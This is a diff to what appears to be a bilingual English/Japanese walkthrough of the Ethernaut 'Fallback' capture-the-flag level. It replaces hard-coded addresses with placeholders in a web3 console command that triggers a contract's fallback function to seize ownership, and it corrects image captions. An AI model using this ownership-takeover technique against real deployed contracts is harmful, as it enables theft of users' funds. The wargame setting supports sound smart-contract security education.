@@ -36,7 +36,10 @@ The goal is to become the Owner of the smart contract to be able to steal all th
 // transaction to the contract with some amount of ether and empty data(so that the
 // fallback function is called)
 
-> await web3.eth.sendTransaction({to:"0x03e95A7EC5F0A70b0855CcBBc2EE428d5a4A3147", value:toWei("0.0001", "ether"), from:"0xe071EeD2EB7CA3514e40d81533046aa90D12f768"})
+// replace the contract address by the one you got when starting the level, and replace the address to send eth from by your own testnet address.
+> await web3.eth.sendTransaction({to:"THE CONTRACT 0x000 ADDRESS", value:toWei("0.0001", "ether"), from:"YOUR 0x000 ADDRESS"})
+
+(example: await web3.eth.sendTransaction({to:"0x03e95A7EC5F0A70b0855CcBBc2EE428d5a4A3147", value:toWei("0.0001", "ether"), from:"0xe071EeD2EB7CA3514e40d81533046aa90D12f768"}))
 
 // in the "owner" storage variable we will see our address now!!
 > await contract.owner()
@@ -50,7 +53,7 @@ Level is completed.
 
 <br/>
 <p align="center">
-<img src="./images/complete.png" width="700" alt="Ethernaut Hello completed">
+<img src="./images/complete.png" width="700" alt="Ethernaut Fallback completed">
 </p>
 <br/>
 
@@ -91,7 +94,11 @@ Level is completed.
 // 契約にはペイアブルなフォールバック receive 関数があるため、
 // ether の金額と空のデータで契約にトランザクションを送信します
 
-> await web3.eth.sendTransaction({to:"0x03e95A7EC5F0A70b0855CcBBc2EE428d5a4A3147", value:toWei("0.0001", "ether"), from:"0xe071EeD2EB7CA3514e40d81533046aa90D12f768"})
+// 下記のコマンドについて、`THE CONTRACT 0x000 ADDRESS` はレベルを開始したときに作成したコントラクトアドレス、`YOUR 0x000 ADDRESS` はあなたのテストネット用のアドレス。
+> await web3.eth.sendTransaction({to:"THE CONTRACT 0x000 ADDRESS", value:toWei("0.0001", "ether"), from:"YOUR 0x000 ADDRESS"})
+
+(例：await web3.eth.sendTransaction({to:"0x03e95A7EC5F0A70b0855CcBBc2EE428d5a4A3147", value:toWei("0.0001", "ether"), from:"0xe071EeD2EB7CA3514e40d81533046aa90D12f768"}))
+
 
 // "owner" ストレージ変数で今度は自分のアドレスが表示されます！
 > await contract.owner()
@@ -105,6 +112,6 @@ Level is completed.
 
 <br/>
 <p align="center">
-<img src="./images/complete.png" width="700" alt="Ethernaut Hello completed">
+<img src="./images/complete.png" width="700" alt="Ethernaut Fallback completed">
 </p>
 <br/>
